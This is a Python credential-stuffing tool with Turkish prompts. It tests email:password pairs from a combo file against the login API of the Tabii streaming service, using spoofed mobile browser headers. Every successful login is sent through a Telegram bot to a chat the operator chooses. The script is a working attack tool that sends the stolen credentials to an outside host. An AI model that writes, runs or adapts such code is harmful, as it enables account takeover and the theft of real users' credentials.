import requests
import os
from cfonts import render

print("\n\n")
kopmk = render('en4rt', colors=['white', 'red'], align='center')
print(kopmk)
print("━" * 55) 

token = input(" - Token Gir: ")
id = input(" - İd Gir: ")
EnartCombo = input(" - Combo gir: ")
os.system('clear')

print("\n\n")
kopmk = render('en4rt', colors=['white', 'red'], align='center')
print(kopmk)
print("━" * 55) 

headers = {
    'authority': 'eu1.tabii.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'tr',
    'app-version': '1.5.2',
    'content-type': 'application/json;charset=UTF-8',
    'device-brand': 'Android',
    'device-connection-type': 'wifi',
    'device-id': '1750889087011_345736',
    'device-language': 'tr-TR',
    'device-model': 'Android 10 - Chrome',
    'device-name': 'Android 10 - Chrome',
    'device-network': '4g',
    'device-orientation': 'Portrait',
    'device-os-name': 'Android',
    'device-os-version': '10',
    'device-resolution': 'Web',
    'device-timezone': 'Europe/Istanbul',
    'device-type': 'WEBTablet',
    'origin': 'https://www.tabii.com',
    'platform': 'Web-Mobile',
    'referer': 'https://www.tabii.com/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    'x-country-code': 'TR',
}


with open(EnartCombo, 'r') as file:
    for line in file:
        try:
            mail, pas = line.strip().split(':')
            data = {
                'email': mail,
                'password': pas,
                'remember': False,
            }
            response = requests.post('https://eu1.tabii.com/apigateway/auth/v2/login', headers=headers, json=data)

            if 'accessToken' in response.text:
                print(f"Başarılı giriş ✅ {mail}:{pas}")
                print("━" * 55) 
                mesaj = f"- Tabii Başarılı Giriş -\n📧Mail: {mail}\n🔑Password: {pas}"
                gonder = f"https://api.telegram.org/bot{token}/sendMessage"
                msj = {
                "chat_id": id,
                "text": mesaj
                }
                
                requests.post(gonder, data=msj)
                                       
            elif 'validationError' in response.text:
                print(f"Yanlış Şifre Fonksiyonu ❌ {mail}:{pas}")
                print("━" * 55) 
            elif 'loginError' in response.text:
                print(f"Başarısız giriş ❌ {mail}:{pas}")
                print("━" * 55) 
            else:
                print("İp ban")

        except Exception as e:
            print("hata")
           